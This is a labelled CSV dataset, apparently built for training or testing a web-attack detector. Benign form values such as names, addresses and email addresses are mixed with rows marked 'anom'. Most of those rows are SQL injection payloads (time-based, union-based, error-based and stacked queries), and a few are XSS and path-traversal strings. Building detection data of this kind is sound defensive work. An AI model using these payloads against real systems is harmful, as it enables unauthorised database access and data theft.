payload,length,attack_type,label
1' in boolean mode);select (case when (8711=6432) then 1 else 8711*(select 8711 from master..sysdatabases) end)--,113,sqli,anom
"1"")) as spvl where 2242=2242 or 6793=(select 6793 from pg_sleep(5))--",69,sqli,anom
"1') as oknw where 8777=8777;iif(4836=1823,1,1/0)",48,sqli,anom
"1%"") and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""%""=""",121,sqli,anom
altafulla,9,norm,norm
pleasande@doloresmusculares.aq,30,norm,norm
rupp@djbroadcast.gov,20,norm,norm
"1"");select (case when (4043=5276) then 4043 else 4043*(select 4043 from information_schema.character_sets) end)#",112,sqli,anom
rad0oelctrico,13,norm,norm
bernadet,8,norm,norm
diffring9@discon.cv,19,norm,norm
"1%')) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('%'='",187,sqli,anom
"1"") waitfor delay '0:0:5' and (""vjpg""=""vjpg",43,sqli,anom
16727733v,9,norm,norm
3742884361976074,16,norm,norm
1) where 9307=9307;select pg_sleep(5)--,39,sqli,anom
4872,4,norm,norm
samia,5,norm,norm
blan2ueo,8,norm,norm
"1"")) as ecnn where 8913=8913 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",134,sqli,anom
05659,5,norm,norm
enri,4,norm,norm
meenaksh,8,norm,norm
"1') and 3824=benchmark(5000000,md5(0x76555642)) and ('mhvy' like 'mhvy",70,sqli,anom
1%'))) and 7533=7533 and ((('%'=',33,sqli,anom
sarris/sartze,13,norm,norm
demetre,7,norm,norm
kazuo,5,norm,norm
33875,5,norm,norm
"1%""))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((""%""=""",79,sqli,anom
enjalbegada,11,norm,norm
nithsdale.livanov@blanquillos.mo,32,norm,norm
"1;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo",94,sqli,anom
-5268') where 5615=5615 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,205,sqli,anom
emdid5,6,norm,norm
nasit_barscha@cortinas-de-aire.eh,33,norm,norm
52218392c,9,norm,norm
09085572c,9,norm,norm
540,3,norm,norm
1') as zxos where 2745=2745;select pg_sleep(5)--,48,sqli,anom
berg@esposo.com.ve,18,norm,norm
2306,4,norm,norm
burkhard,8,norm,norm
dennett,7,norm,norm
18223647b,9,norm,norm
59041581y,9,norm,norm
guarrate,8,norm,norm
afiligr*anado,13,norm,norm
burns-gerron@100mbps.ht,23,norm,norm
58188584x,9,norm,norm
"-4770))) union all select 6356,6356,6356,6356,6356#",51,sqli,anom
1'||(select 'pyga' from dual where 8501=8501 or (select * from (select(sleep(5)))sddo)#,87,sqli,anom
moriego,7,norm,norm
c/ domingo bello espinosa 138,29,norm,norm
65236882g,9,norm,norm
sorzano,7,norm,norm
92937803r,9,norm,norm
berto,5,norm,norm
1') and (select * from (select(sleep(5)))gcrr)#,47,sqli,anom
dinelli@alcantarapartners.mt,28,norm,norm
08611,5,norm,norm
schauer,7,norm,norm
"1')) as popm where 6594=6594 union all select null,null#",56,sqli,anom
"<img src=""livescript:document.cookie=true;"">",44,xss,anom
"-4408"") or 6872=6872 and (""oenu""=""oenu",38,sqli,anom
"1));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",88,sqli,anom
tomkin,6,norm,norm
"1""))) or 8156=(select count(*) from generate_series(1,5000000))--",65,sqli,anom
"1%"");if(9953=4347) select 9953 else drop function ocau--",56,sqli,anom
proffit,7,norm,norm
"nicaragua, 195,",15,norm,norm
hube@gemas.org.aero,19,norm,norm
"espluga calba, l'",17,norm,norm
1026055264847672,16,norm,norm
padmanab,8,norm,norm
89740217j,9,norm,norm
freeley,7,norm,norm
miles,5,norm,norm
6684,4,norm,norm
"1"") as htyo where 8322=8322 and 4595=4595#",42,sqli,anom
pingshen,8,norm,norm
1)) and 4595=4595#,18,sqli,anom
quijano,7,norm,norm
uresh,5,norm,norm
joudrey,7,norm,norm
86704903d,9,norm,norm
/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{file},43,path-traversal,anom
0213218776616277,16,norm,norm
"-4970') union all select 4625,4625,4625,4625,4625,4625,4625,4625#",65,sqli,anom
"1' where 4460=4460;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",86,sqli,anom
ralf,4,norm,norm
11039917d,9,norm,norm
1937545396216025,16,norm,norm
8033,4,norm,norm
89388462c,9,norm,norm
"1'))) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",81,sqli,anom
1;select sleep(5),17,sqli,anom
aliaguilla,10,norm,norm
fadlalla,8,norm,norm
16667079z,9,norm,norm
"1))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",102,sqli,anom
"1%"") union all select null,null#",32,sqli,anom
"1"") where 4951=4951;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",104,sqli,anom
"calle manco, 109, 10-g",22,norm,norm
61323691x,9,norm,norm
artigas girut,13,norm,norm
ajorca,6,norm,norm
encatusar,9,norm,norm
"1"" and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",78,sqli,anom
woodburn@vinavilano.hr,22,norm,norm
"1') as ycsr where 2238=2238 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",130,sqli,anom
karrantza harana/valle de carranza,34,norm,norm
"1 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)-- gynj",105,sqli,anom
1') and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('mptm'='mptm,208,sqli,anom
"-2225' union all select 1545,1545,1545,1545#",44,sqli,anom
"1"")) as szxa where 1501=1501 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",131,sqli,anom
alexandrova@soybueno.jo,23,norm,norm
07485924e,9,norm,norm
olmos de ojeda,14,norm,norm
"1') where 3255=3255 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",128,sqli,anom
frau puigveh,12,norm,norm
74835105m,9,norm,norm
"-1617%"" or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""%""=""",197,sqli,anom
2161o1o,7,norm,norm
keighley,8,norm,norm
"-4012"") or make_set(9354=9354,7185) and (""ccfn""=""ccfn",53,sqli,anom
"1"") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""ikaf"" like ""ikaf",87,sqli,anom
casas de miravete,17,norm,norm
bentos campins,14,norm,norm
"plza. nuevo mundo, 119, 4-d",27,norm,norm
37718,5,norm,norm
-6792)) as zlho where 4758=4758 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,213,sqli,anom
09239,5,norm,norm
-6122'))) or 9243=6161--,24,sqli,anom
"boyero 165, 13?f",16,norm,norm
"1'||(select 'eayf' where 5431=5431 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null))||'",146,sqli,anom
san vicente de la cabeza,24,norm,norm
modugno@wdsl.int,16,norm,norm
67estada,8,norm,norm
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../{file},319,path-traversal,anom
clarucha,8,norm,norm
labaque pericas,15,norm,norm
77731441c,9,norm,norm
pereira,7,norm,norm
8158777429783500,16,norm,norm
"1"" where 7344=7344 rlike (select * from (select(sleep(5)))sgvo)--",65,sqli,anom
0669143201019058,16,norm,norm
"1""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""nrhz"" like ""nrhz",180,sqli,anom
gascons mol,11,norm,norm
"1"") where 8254=8254 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",160,sqli,anom
borobia,7,norm,norm
de2ape91ibi1ie4to,17,norm,norm
47939000p,9,norm,norm
"1%"")));begin user_lock.sleep(5); end and (((""%""=""",49,sqli,anom
ladi,4,norm,norm
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'pziy'='pziy,113,sqli,anom
"-3116)) as jyiq where 3875=3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#",89,sqli,anom
0945491492259147,16,norm,norm
1') as bscn where 6907=6907;select (case when (1724=6528) then 1724 else cast(1 as int)/(select 0 from dual) end) from dual--,125,sqli,anom
13026737c,9,norm,norm
nicastro,8,norm,norm
gamal,5,norm,norm
511amasa,8,norm,norm
schaafsma@gay-tantra.sj,23,norm,norm
vlez de benaudalla,18,norm,norm
6672454826209975,16,norm,norm
1'));(select * from (select(sleep(5)))acdk)#,44,sqli,anom
puy,3,norm,norm
"-3279"" union all select 8568,8568,8568,8568--",45,sqli,anom
gaulle,6,norm,norm
"-9718%"") union all select 9515,9515,9515#",41,sqli,anom
-8963) where 8528=8528 or (2470=3271)*3271--,44,sqli,anom
46179,5,norm,norm
"1'))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((('yqhk'='yqhk",117,sqli,anom
"1%""))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (((""%""=""",108,sqli,anom
a99b3do,7,norm,norm
"1 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)-- wvjy",98,sqli,anom
robles arteaga,14,norm,norm
"1)) as mmby where 3990=3990 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",103,sqli,anom
homs amazarray,14,norm,norm
jobye,5,norm,norm
"virgen del valsordo, 44, 3-a",28,norm,norm
grimsley,8,norm,norm
membrilla,9,norm,norm
"1"") where 4849=4849 or 8421=(select count(*) from generate_series(1,5000000))--",79,sqli,anom
r09p8tuo49m+en2e,16,norm,norm
mazzotti9@novaservicios.bi,26,norm,norm
remante,7,norm,norm
6865,4,norm,norm
ezcurra lo cascio,17,norm,norm
quilligan.posselt@thw-adm.gy,28,norm,norm
limaco,6,norm,norm
/./../../../.{file},19,path-traversal,anom
raysa,5,norm,norm
1%'));(select * from (select(sleep(5)))srmq) and (('%'=',56,sqli,anom
castilblanco,12,norm,norm
"1%')) union all select null,null--",34,sqli,anom
ketchum,7,norm,norm
marchagaz,9,norm,norm
38980059g,9,norm,norm
mud6787t6,9,norm,norm
8i273e,6,norm,norm
37618946p,9,norm,norm
medina del campo,16,norm,norm
"1"";waitfor delay '0:0:5'--",26,sqli,anom
5a4a84e8a,9,norm,norm
47282,5,norm,norm
c0l0o4a,7,norm,norm
"-2247') union all select 1202,1202,1202,1202,1202#",50,sqli,anom
sikes-jeans@923.mv,18,norm,norm
es3an7oso,9,norm,norm
nandan,6,norm,norm
"1"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""ardk"" like ""ardk",211,sqli,anom
manacor,7,norm,norm
"1%"")) rlike (select (case when (4207=1757) then 1 else 0x28 end)) and ((""%""=""",77,sqli,anom
"1'))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('zoxm' like 'zoxm",124,sqli,anom
albuixech,9,norm,norm
38450,5,norm,norm
1888,4,norm,norm
ma724-3ra,9,norm,norm
"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('dcys' like 'dcys",141,sqli,anom
"1%"" rlike (select * from (select(sleep(5)))vwyq)#",49,sqli,anom
vanderbu,8,norm,norm
-6473' union all select 7537#,29,sqli,anom
"1)) as tuxy where 6855=6855 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",134,sqli,anom
3720042690454906,16,norm,norm
soffia,6,norm,norm
-8463))) or 4861=9834#,22,sqli,anom
"-6381%"" or 8571=8571--",22,sqli,anom
"cruz de caravaca, 177",21,norm,norm
"aguila s/n, 6-g",15,norm,norm
0851327510236186,16,norm,norm
antigua,7,norm,norm
vila-sana,9,norm,norm
"1 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))-- gkcl",204,sqli,anom
784,3,norm,norm
khariton,8,norm,norm
"1')) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('esma' like 'esma",124,sqli,anom
alcorisa,8,norm,norm
"-5139)) union all select 3373,3373,3373,3373,3373,3373,3373,3373#",65,sqli,anom
"calle titania 45, 5d",20,norm,norm
yie-tarn,8,norm,norm
liotard_rudhyar@zarasalud.gi,28,norm,norm
errol@diseodesoftware.ml,24,norm,norm
atolera,7,norm,norm
../../web-inf/web.xml,21,path-traversal,anom
"1')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('hpbt'='hpbt",120,sqli,anom
tortuero,8,norm,norm
c96reveidil5,12,norm,norm
"1')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('kmjn'='kmjn",97,sqli,anom
intxaurraga,11,norm,norm
requilorio,10,norm,norm
-8080')) order by 1#,20,sqli,anom
"1"") where 2657=2657 and 5309=7592--",35,sqli,anom
2829,4,norm,norm
"1"")));(select * from (select(sleep(5)))srmq) and (((""eakt"" like ""eakt",69,sqli,anom
ferree,6,norm,norm
banderizar,10,norm,norm
8691836176757675,16,norm,norm
"1"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ""sckh""=""sckh",113,sqli,anom
"-2722"") or 4907=8126#",21,sqli,anom
"1);select benchmark(5000000,md5(0x4c4d6142)) and (8126=8126",59,sqli,anom
09737,5,norm,norm
5251,4,norm,norm
gema,4,norm,norm
cceres,6,norm,norm
18011,5,norm,norm
nodonk@locuraporno.ar,21,norm,norm
avril,5,norm,norm
05215,5,norm,norm
1 rlike sleep(5),16,sqli,anom
corcos,6,norm,norm
1)) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((5281=5281,206,sqli,anom
"1') and elt(4249=4249,7259) and ('bxnn'='bxnn",45,sqli,anom
"1%"")) union all select null,null,null,null,null,null--",54,sqli,anom
sandford@directoriogratuito.yu,30,norm,norm
"1 or 8156=(select count(*) from generate_series(1,5000000))--",61,sqli,anom
jawdokimov@manzanilladevillafafila.np,37,norm,norm
lizana rom,10,norm,norm
36668,5,norm,norm
dao,3,norm,norm
-1300) as rrsm where 1086=1086 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,230,sqli,anom
horalek,7,norm,norm
"-1305) or make_set(2298=5545,5545) and (6715=6715",49,sqli,anom
5218,4,norm,norm
1';select sleep(5) and 'beuk'='beuk,35,sqli,anom
recobracin,10,norm,norm
"1'||(select 'pmpd' where 9803=9803;call regexp_substring(repeat(right(char(3702),0),500000000),null))||'",104,sqli,anom
hinwood-laretei@addl.es,23,norm,norm
"<xml id=i><x><c><![cdata[<img id=xss src=""javas]]<![cdata[cript:alert('xss');"">]]</c><x></xml>",94,xss,anom
hormilla,8,norm,norm
"eliana, l'",10,norm,norm
26520,5,norm,norm
sangres,7,norm,norm
"1' where 4149=4149 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",81,sqli,anom
"1%') or 8514=benchmark(5000000,md5(0x544d5a4c))#",48,sqli,anom
matthiew,8,norm,norm
alcolea del pinar,17,norm,norm
"1')));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",90,sqli,anom
4330235428458719,16,norm,norm
34965589t,9,norm,norm
"1%' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and '%'='",121,sqli,anom
"1'))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('trdf' like 'trdf",226,sqli,anom
"1) where 2010=2010;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",110,sqli,anom
"1%' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and '%'='",184,sqli,anom
rodvold@mytanga.om,18,norm,norm
"1"") where 2873=2873 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",121,sqli,anom
"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('pwpc'='pwpc",136,sqli,anom
pascacio,8,norm,norm
3394,4,norm,norm
-3450' where 4478=4478 or 9323=9323#,36,sqli,anom
"calle muelles, 70, 6g",21,norm,norm
6030066949262681,16,norm,norm
"1""))) rlike sleep(5)#",21,sqli,anom
"1)) union all select null,null,null#",36,sqli,anom
thibaut,7,norm,norm
selva,5,norm,norm
"-9606 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# iuij",206,sqli,anom
"1 and elt(3114=3114,sleep(5))#",30,sqli,anom
dirck,5,norm,norm
benicolet,9,norm,norm
1230,4,norm,norm
hermindo,8,norm,norm
49190,5,norm,norm
"-3872%""))) union all select 1637,1637,1637,1637,1637#",53,sqli,anom
indiestro,9,norm,norm
"1"");begin user_lock.sleep(5); end and (""xksk""=""xksk",51,sqli,anom
sldisk,6,norm,norm
genoveva,8,norm,norm
"1';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",99,sqli,anom
-5769) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq'),99,sqli,anom
-6233') where 9820=9820 or 3038=3038,36,sqli,anom
1') as xqbq where 1619=1619 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,123,sqli,anom
macilento,9,norm,norm
"1')) as uncy where 8009=8009 union all select null,null,null,null,null,null,null,null,null#",91,sqli,anom
tele,4,norm,norm
1%'))) and 2006=2006,20,sqli,anom
1;select case when 2599=7035 then 1 else null end--,51,sqli,anom
81023504r,9,norm,norm
"1"") where 4426=4426 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",202,sqli,anom
llompart maydana,16,norm,norm
1'+(select xzvf where 9727=9727;(select * from (select(sleep(5)))acdk)#,71,sqli,anom
desyerbadora,12,norm,norm
lobanillo,9,norm,norm
"1'));iif(8213=4718,1,1/0)",25,sqli,anom
halm@sietepeines.ht,19,norm,norm
c/ doctores lasso simarro 30,28,norm,norm
"masia can ruti 142, 1-b",23,norm,norm
08230,5,norm,norm
1')) as fqia where 1936=1936 and (select * from (select(sleep(5)))fzno)--,73,sqli,anom
"calle colada de pozuelo, 43,",28,norm,norm
16240,5,norm,norm
1)));begin user_lock.sleep(5); end--,36,sqli,anom
candelario,10,norm,norm
0353282720195441,16,norm,norm
"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",74,sqli,anom
0683879802529946,16,norm,norm
blotta azagra,13,norm,norm
5889772581195146,16,norm,norm
kiley,5,norm,norm
paraire credido,15,norm,norm
chalanera,9,norm,norm
ingenio,7,norm,norm
"1' and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'moyb'='moyb",215,sqli,anom
"<img """"""><script>alert(""crosssitescripting"")</script>"">",55,xss,anom
1')) and 7230=2517,18,sqli,anom
"1%')) and 3824=benchmark(5000000,md5(0x76555642)) and (('%'='",61,sqli,anom
di9l,4,norm,norm
"-2140)) union all select 8174,8174,8174#",40,sqli,anom
"1"") where 1024=1024 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",172,sqli,anom
"1"")) and 9800=8713",18,sqli,anom
"1) and 8635=(select count(*) from generate_series(1,5000000))--",63,sqli,anom
aul,3,norm,norm
"1"") as firv where 4522=4522 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",134,sqli,anom
kannel,6,norm,norm
"1' where 1031=1031 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",124,sqli,anom
